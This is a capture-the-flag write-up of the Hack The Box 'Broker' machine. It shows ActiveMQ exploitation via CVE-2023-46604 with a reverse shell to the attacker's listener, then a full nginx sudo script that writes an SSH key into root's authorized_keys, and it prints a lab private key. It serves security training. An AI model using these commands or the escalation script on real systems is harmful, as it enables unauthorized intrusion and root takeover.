# Broker - HTB Labs Writeup

**Machine:** Broker (Linux)

**Difficulty:** Easy


<img width="1025" height="223" alt="11" src="https://github.com/user-attachments/assets/7b895b7c-1cf7-4a0d-b5d3-3a645b2ff609" />


## Background / Scope
- **Target IP:** `10.10.11.243`
- **Goal:** Obtain `user.txt` and `root.txt (or Administrator privilege) on the machine in a lab environment
- **Machine Info:**  Broker is an easy difficulty `Linux` machine hosting a version of `Apache ActiveMQ`. Enumerating the version of `Apache ActiveMQ` shows that it is vulnerable to `Unauthenticated Remote Code Execution`, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `activemq` user to execute `sudo /usr/sbin/nginx`, which is similar to the recent `Zimbra` disclosure and is leveraged to gain `root` access

## Target enumeration (nmap)

Nmap-scan to discover open ports/services and versions

```text
# nmap -sC -sV 10.10.11.243   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 11:59 EST
Nmap scan report for 10.10.11.243
Host is up (0.54s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.67 seconds
```

We see only two ports are open.Let's enumerate port HTTP(80)


## HTTP Enumeration

When I tried to open up website, It required the username and password.I tried default credentials `admin:admin`.It worked!



<img width="1250" height="411" alt="12" src="https://github.com/user-attachments/assets/81641df3-e370-4373-b985-2f24357bbfa4" />


`Apache ActiveMQ` is an open-source message broker written in Java that allows applications to communicate asynchronously using queues and topics.

I looked at the `/admin` page and found this web is running `ActiveMQ 5.15.15`

<img width="1010" height="535" alt="13" src="https://github.com/user-attachments/assets/4769fa9a-fde4-4905-bac6-becb0492569f" />



## Exploitation


I've found this [Exploit](https://github.com/vulncheck-oss/cve-2023-46604) and  modified the exploit to make it compatible with my system's ARM64 architecture

```text
# go mod tidy
GOOS=linux GOARCH=arm64
go build -o build/cve-2023-46604_linux-arm64 cve-2023-46604.go
```

After nmap scanning we found only 2 ports are open HTTP(80) and SSH(22).I tried to exploit this using HTTP port open, but it failed

```text
─# ./build/cve-2023-46604_linux-arm64 -v -c -e -rhost 10.10.11.243 -rport 80 -lhost 10.10.16.4 -lport 1270 -httpAddr 10.10.11.243 -c2 SimpleShellServer
time=2025-11-02T12:15:36.719-05:00 level=STATUS msg="Starting listener on 10.10.16.4:1270"
time=2025-11-02T12:15:36.720-05:00 level=STATUS msg="Starting target" index=0 host=10.10.11.243 port=80 ssl=false "ssl auto"=false
time=2025-11-02T12:15:36.720-05:00 level=STATUS msg="Validating Apache ActiveMQ target" host=10.10.11.243 port=80
time=2025-11-02T12:16:06.720-05:00 level=ERROR msg="Timeout met. Shutting down shell listener."
time=2025-11-02T12:16:06.725-05:00 level=STATUS msg="C2 received shutdown, killing server and client sockets for shell server"
time=2025-11-02T12:16:06.725-05:00 level=STATUS msg="C2 server exited"
time=2025-11-02T12:16:37.641-05:00 level=ERROR msg="Failed to read from the socket: EOF"
time=2025-11-02T12:16:37.641-05:00 level=STATUS msg="The target isn't recognized as Apache ActiveMQ" host=10.10.11.243 port=80 verified=false
time=2025-11-02T12:16:37.641-05:00 level=STATUS msg="C2 received shutdown, killing server and client sockets for shell server"
```

Let's see if the actual OpenWire service is exposed on other ports:

```text
└─# nmap -p 61613,61614,61616,8161,8162 10.10.11.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 12:21 EST
Nmap scan report for 10.10.11.243
Host is up (0.48s latency).

PORT      STATE  SERVICE
8161/tcp  open   patrol-snmp
8162/tcp  closed lpar2rrd
61613/tcp open   unknown
61614/tcp open   unknown
61616/tcp open   unknown
```

I don't know why nmap scanning didn't output about all ports open on this machine, but now we can exploit this using example showing in our [Exploit](https://github.com/vulncheck-oss/cve-2023-46604)

I've successfully got a Shell
```text
# ./build/cve-2023-46604_linux-arm64 -v -c -e -rhost 10.10.11.243 -rport 61616 -lhost 10.10.16.4 -lport 4444 -httpAddr 10.10.16.4 -c2
SimpleShellServer
time=2025-11-02T12:55:58.302-05:00 level=STATUS msg="Starting listener on 10.10.16.4:4444"
time=2025-11-02T12:55:58.302-05:00 level=STATUS msg="Starting target" index=0 host=10.10.11.243 port=61616 ssl=false "ssl auto"=false
time=2025-11-02T12:55:58.302-05:00 level=STATUS msg="Validating Apache ActiveMQ target" host=10.10.11.243 port=61616
time=2025-11-02T12:55:59.223-05:00 level=SUCCESS msg="Target verification succeeded!" host=10.10.11.243 port=61616 verified=true
time=2025-11-02T12:55:59.223-05:00 level=STATUS msg="Running a version check on the remote target" host=10.10.11.243 port=61616
time=2025-11-02T12:56:00.229-05:00 level=VERSION msg="The reported version is 5.15.15" host=10.10.11.243 port=61616 version=5.15.15
time=2025-11-02T12:56:00.229-05:00 level=SUCCESS msg="The target appears to be a vulnerable version!" host=10.10.11.243 port=61616 vulnerable=yes
time=2025-11-02T12:56:00.229-05:00 level=STATUS msg="Sending a reverse shell payload for port 10.10.16.4:4444"
time=2025-11-02T12:56:00.230-05:00 level=STATUS msg="HTTP server listening for 10.10.16.4:8080/EQOrerFvQXFL"
time=2025-11-02T12:56:02.230-05:00 level=STATUS msg=Connecting...
time=2025-11-02T12:56:02.784-05:00 level=STATUS msg="Sending exploit"
time=2025-11-02T12:56:03.817-05:00 level=STATUS msg="Sending payload"
time=2025-11-02T12:56:04.920-05:00 level=STATUS msg="Sending payload"
time=2025-11-02T12:56:05.930-05:00 level=SUCCESS msg="Caught new shell from 10.10.11.243:57960"
time=2025-11-02T12:56:05.930-05:00 level=STATUS msg="Active shell from 10.10.11.243:57960"
time=2025-11-02T12:56:07.785-05:00 level=SUCCESS msg="Exploit successfully completed" exploited=true
whoami
activemq
```

## Privilege Escalation

First, I tried to search for SUID binaries,but it's asking for `sudo` password

```text
activemq@broker:~$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null

/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

Let's see list of commands which we can run as root without a password

```text
activemq@broker:~$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

So I found [exploit]( https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406) , where we can Privilege Escalation

```bash
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

I copied this to `exploit.sh` and run it

```text
activemq@broker:~$ chmod +x exploit.sh
chmod +x exploit.sh
activemq@broker:~$ ./exploit.sh
./exploit.sh
[+] Creating configuration...
[+] Loading configuration...
[+] Generating SSH Key...
Generating public/private rsa key pair.

Enter file in which to save the key (/home/activemq/.ssh/id_rsa): 
Created directory '/home/activemq/.ssh'.
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/activemq/.ssh/id_rsa
Your public key has been saved in /home/activemq/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:t9GLJ2ZmpdZuMR1Wq0z8qKyEEzHM3e5nnNvaTCh8reQ activemq@broker
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|      o . .     .|
|       = . ..  ..|
|        o .. oo. |
|       .S o.=o+. |
|        o.oB+==. |
|       o .%+=@ o |
|        o* *O B  |
|         ....E.+ |
+----[SHA256]-----+
[+] Display SSH Private Key for copy...
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
[+] Add key to root user...
[+] Use the SSH key to get access
```

Now we got id_rsa key.I run ssh using our SSH key.Now we can get `root`



<img width="623" height="264" alt="14" src="https://github.com/user-attachments/assets/8bd2a9b3-6c6f-4d78-8c02-67252110471c" />

Now we have Root!

```text
root@broker:~# ls
cleanup.sh  root.txt
root@broker:~# cat root.txt
4a46ae40a3*******************
```

## Conclusion

The **Broker** machine demonstrates a simple yet realistic attack chain often seen in enterprise environments.  
It starts with **default credentials** on an exposed service, leading to **remote code execution** through a known vulnerability in Apache ActiveMQ (CVE-2023-46604).  
After gaining initial access as `activemq`, privilege escalation was achieved due to a **sudo misconfiguration** allowing `nginx` to run as root.  

This machine highlights three key security lessons:
1. Never leave default credentials enabled.  
2. Keep middleware software (like ActiveMQ) patched.  
3. Always restrict and review `sudo` permissions.

Finally, successful exploitation resulted in obtaining both `user.txt` and `root.txt` flags.

⭐ If you found this writeup helpful — consider giving a star on GitHub!


